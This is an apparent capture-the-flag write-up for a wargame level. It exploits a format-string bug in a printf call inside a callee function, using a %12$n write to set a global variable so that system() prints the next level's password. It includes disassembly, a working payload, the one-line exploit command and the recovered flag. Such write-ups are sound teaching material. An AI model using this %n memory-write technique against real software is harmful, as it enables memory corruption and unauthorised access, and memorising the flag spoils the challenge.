# Way to level5

## Core
Same FSB + cmp shape as level3, but `printf` lives in a separate callee `p()`
(`main → n(fgets) → p(printf)`) → the stack slots are farther, giving **offset 12**. Make
global `0x8049810` equal `0x1025544` and `system` runs.

## Decisive disass (full: `disas n`, `disas p`)
```
n:
<+35>: call fgets@plt
<+49>: call p                ; printf(buf) inside p <- FSB
<+54>: mov  0x8049810,%eax
<+59>: cmp  $0x1025544,%eax   ; target value
<+64>: jne  n+78            ; on pass: system(0x8048590)
```

## Exploit
- offset 12 (derivation): in `AAAA` + `%x`*12, `41414141` appears at the **12th** (printf
  descends one more frame into `p()`, adding stack frames). level3 was 4.
- Value/address: address `0x8049810` (mov @ n+54), target `0x1025544 = 16,930,116` (cmp @
  n+59, decimal).
- payload: `\x10\x98\x04\x08` + `%016930112x` + `%12$n`.
  width = 16,930,116 − addr 4 = **16,930,112** → `%016930112x`.
  `%016930112x` is a **width specifier** (input ~12B) that only produces ~16M output chars →
  unrelated to the fgets 0x200 cap.
- Delivery: `system(0x8048590)` = via `x/s` is `/bin/cat .../level5/.pass` → a **one-shot
  command**, so no cat - trick; a plain pipe prints the pass.
```bash
python -c 'print "\x10\x98\x04\x08%016930112x%12$n"' | ./level4
```

## Diff from previous
Technique (FSB + cmp) is identical to level3. Two differences: (1) printf is in a callee, so
offset 4→12 → direct access **`%12$n`** instead of positional padding (the 11 leading slots
have variable widths you cannot count). (2) `system`'s argument is cat run directly, not
`/bin/sh` → the cat - trick is dropped.

## Result
`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
